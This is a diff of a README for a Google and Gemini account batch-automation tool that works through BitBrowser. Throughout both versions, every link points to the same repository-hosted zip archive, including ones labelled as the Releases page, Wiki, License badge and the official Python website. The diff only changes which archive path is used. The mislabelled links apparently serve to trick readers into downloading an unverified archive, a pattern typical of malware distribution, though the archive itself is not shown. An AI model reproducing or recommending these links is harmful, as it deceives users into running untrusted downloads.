@@ -1,8 +1,8 @@
 # 🚀 google-account-automanager - Effortlessly Manage Your Google Accounts
 
-[![Download](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip%20Now-Repo%20Releases-brightgreen)](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip) ![License](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip) ![Python](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip)
+[![Download](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip%20Now-Repo%20Releases-brightgreen)](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip) ![License](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip) ![Python](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip)
 
-English | **[中文](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip)**
+English | **[中文](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip)**
 
 ---
 
@@ -14,7 +14,7 @@ Gemini Account AutoManager is an automation system that simplifies batch operati
 
 To get started with google-account-automanager, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip).
    
 2. **Choose the Correct Version**: Look for the latest version. It will generally be at the top of the page.
 
@@ -52,7 +52,7 @@ To get started with google-account-automanager, follow these steps:
 ## 🚀 Getting Started
 
 ### 1. Install Dependencies
-Ensure that you have Python 3.12 installed on your computer. You can download it from the [official Python website](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip).
+Ensure that you have Python 3.12 installed on your computer. You can download it from the [official Python website](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip).
 
 ### 2. Configuration
 - **Local API**: The system uses BitBrowser which operates with a local API. By default, this API runs at `127.0.0.1:54345`. Ensure this service is running for optimal performance.
@@ -63,7 +63,7 @@ Ensure that you have Python 3.12 installed on your computer. You can download it
 
 ## 📖 Documentation
 
-For detailed documentation on using each feature, check the manual included in the application folder or visit the [Wiki](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip).
+For detailed documentation on using each feature, check the manual included in the application folder or visit the [Wiki](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip).
 
 ## 📧 Support
 
@@ -75,11 +75,11 @@ If you would like to contribute to the project, please fork the repository, make
 
 ## 🔗 Additional Resources
 
-- **GitHub Page**: [google-account-automanager](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip)
+- **GitHub Page**: [google-account-automanager](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip)
 - **BitBrowser Documentation**: Refer to the official documentation for BitBrowser to understand how it works with this application.
 
 ---
 
 **Remember:** Always ensure to have proper backups of your accounts before performing batch operations. Follow the guidelines, and enjoy seamless management of your Google accounts!
 
-[![Download](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip%20Now-Repo%20Releases-brightgreen)](https://raw.githubusercontent.com/ELIEER103/google-account-automanager/main/docs/en/automanager-google-account-3.9.zip)
+[![Download](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip%20Now-Repo%20Releases-brightgreen)](https://github.com/ELIEER103/google-account-automanager/raw/refs/heads/main/web/backend/google-automanager-account-2.3.zip)
